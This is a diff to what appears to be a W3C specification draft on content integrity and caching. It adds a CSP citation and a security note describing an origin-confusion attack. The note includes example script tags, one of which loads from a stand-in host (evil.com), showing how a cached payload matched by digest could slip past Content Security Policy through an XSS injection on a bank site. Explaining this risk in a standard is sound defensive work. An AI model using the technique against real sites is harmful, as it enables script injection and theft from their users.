@@ -46,6 +46,17 @@
         wgPatentURI:  "http://www.w3.org/2004/01/pp-impl/49309/status",
 
         localBiblio: {
+          "CSP": {
+            title: "Content Security Policy 1.1",
+            href: "http://w3.org/TR/CSP11",
+            authors: [
+              "Adam Barth",
+              "Dan Veditz",
+              "Mike West"
+            ],
+            status: "Working Draft",
+            publisher: "W3C"
+          },
           "MIMETYPE": {
             title: "Multipurpose Internet Mail Extensions (MIME) Part Two: Media Types",
             href: "http://tools.ietf.org/html/rfc2046",
@@ -1062,9 +1073,41 @@ or not to read data straight from the cache.</p>
           <p>XMLHttpRequest may only load data from same-origin resources, or from
 resources delivered with proper CORS headers. [[!XMLHTTPREQUEST]]</p>
         </li>
+        <li>
+          <p>Content Security Policy performs origin-based security checks. [[!CSP]]</p>
+        </li>
       </ul>
 
-      <p class="todo">TODO: Moar.</p>
+      <p class="todo">TODO: Moar?</p>
+
+      <div class="note">
+        <p>The simple cache-poisoning version of this attack can be mitigated by
+requiring strong hash functions for cachable resources. More complex
+variants are more difficult to mitigate. Consider the following:</p>
+
+        <ol>
+          <li>
+            <p>An attacker lures Alice to a page containing the following code:</p>
+
+            <pre><code>&lt;script src="http://evil.com/evil.js" digest="ni://sha-256;123...789"&gt;
+</code></pre>
+          </li>
+          <li>
+            <p>Alice&#8217;s user agent loads <code>evil.js</code>, and stores it in her cache.</p>
+          </li>
+          <li>
+            <p>Though <code>bank.com</code> is protected by a CSP which allows only script from
+<code>bank.com</code>, the attacker may still be able to exploit an XSS vulnerability
+in <code>bank.com</code> which allows the injection of:</p>
+
+            <pre><code>&lt;script src="http://bank.com/awesome.js" digest="ni://sha-256;123...789"&gt;
+</code></pre>
+
+            <p>Since the script appears to come from <code>bank.com</code>, CSP allows it, even though
+it doesn&#8217;t actually exist on that server.</p>
+          </li>
+        </ol>
+      </div>
 
     </section>
     <!-- /Caching::Risks::Origin confusion -->
